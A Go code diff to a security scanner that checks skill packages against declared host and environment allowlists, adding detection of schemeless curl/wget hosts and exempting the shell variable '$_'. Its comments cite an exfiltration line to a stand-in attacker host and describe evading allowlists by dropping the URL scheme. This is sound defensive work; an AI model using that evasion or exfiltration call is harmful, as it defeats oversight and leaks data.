@@ -176,6 +176,20 @@ var signatures = []signature{
 // hostRe extracts hostnames from URLs to enrich network evidence.
 var hostRe = regexp.MustCompile(`(?i)https?://([a-z0-9.\-]+)`)
 
+// schemelessHostRe captures a bare dotted hostname passed as the URL argument to
+// curl/wget when the token carries no http(s):// scheme. curl and wget implicitly
+// treat a schemeless arg as http://, so `curl evil.attacker/exfil` is a real
+// network call — but hostRe above only matches https?:// hosts, so v0.4 recorded
+// ZERO host hits for such a line. A skill declaring a finite host allowlist then
+// verified GREEN even though it reached an off-allowlist host, defeating the m4
+// host-allowlist enforcement. Feeding this capture through observedHost lets
+// checkHostAllowlist diff it. The optional `-[A-Za-z]+` flag cluster skips
+// `-s`/`-fsSL`/`-qO-` style flags so the host arg (not a flag) is captured. A
+// scheme-prefixed arg never matches here: `https://` interrupts the dotted-host
+// pattern before a TLD, so all existing scheme-prefixed fixtures are unaffected.
+// (v0.5, fix-host-allowlist-schemeless-evasion.)
+var schemelessHostRe = regexp.MustCompile(`(?i)\b(?:curl|wget)\b\s+(?:-[A-Za-z]+\s+)*([a-z0-9][a-z0-9.\-]*\.[a-z]{2,})\b`)
+
 // envNameRe captures the bare variable NAME from a shell $VAR / ${VAR} / ${VAR:-x}
 // reference. The leading capture group is just the name, so a default-value
 // expansion like ${AWS_SECRET_ACCESS_KEY:-} still yields AWS_SECRET_ACCESS_KEY.
@@ -212,6 +226,11 @@ var pipedCmdRe = regexp.MustCompile(`\|\s*(?:sudo\s+)?([A-Za-z_][\w.\-/]*)`)
 // shellBuiltinEnv are shell-provided variables that are not skill-author secrets
 // and must not be treated as an undeclared env capability when matched by the
 // broad $VAR heuristic. They are universally present in any shell environment.
+// `_` is included because it is the shell's last-argument special parameter,
+// not an author-declared env var: envNameRe matches `$_` since `_` is in its
+// leading char class `[A-Z_]`, so without this entry a skill that legitimately
+// uses `$_` with a finite env allowlist was false-REJECTED (v0.5,
+// fix-underscore-shell-var-env-falsepositive).
 var shellBuiltinEnv = map[string]bool{
 	"HOME": true, "PATH": true, "PWD": true, "OLDPWD": true, "SHELL": true,
 	"USER": true, "LOGNAME": true, "HOSTNAME": true, "TERM": true, "LANG": true,
@@ -219,7 +238,7 @@ var shellBuiltinEnv = map[string]bool{
 	"PS1": true, "PS2": true, "RANDOM": true, "SECONDS": true, "LINENO": true,
 	"PPID": true, "UID": true, "EUID": true, "BASH": true, "BASH_VERSION": true,
 	"SHLVL": true, "FUNCNAME": true, "BASH_SOURCE": true, "OPTARG": true,
-	"OPTIND": true, "REPLY": true,
+	"OPTIND": true, "REPLY": true, "_": true,
 }
 
 // Scan walks dir, parses SKILL.md, and detects observed capabilities.
@@ -435,6 +454,11 @@ func (r *Result) scanFile(path, rel string) error {
 			})
 			if sig.cap == CapNet {
 				for _, h := range hostRe.FindAllStringSubmatch(line, -1) {
+					r.observedHost(h[1], rel, lineNo)
+				}
+				// Also capture a schemeless curl/wget host arg (e.g. `curl evil.host`)
+				// so the host allowlist diff cannot be evaded by dropping the scheme.
+				for _, h := range schemelessHostRe.FindAllStringSubmatch(line, -1) {
 					r.observedHost(h[1], rel, lineNo)
 				}
 			}
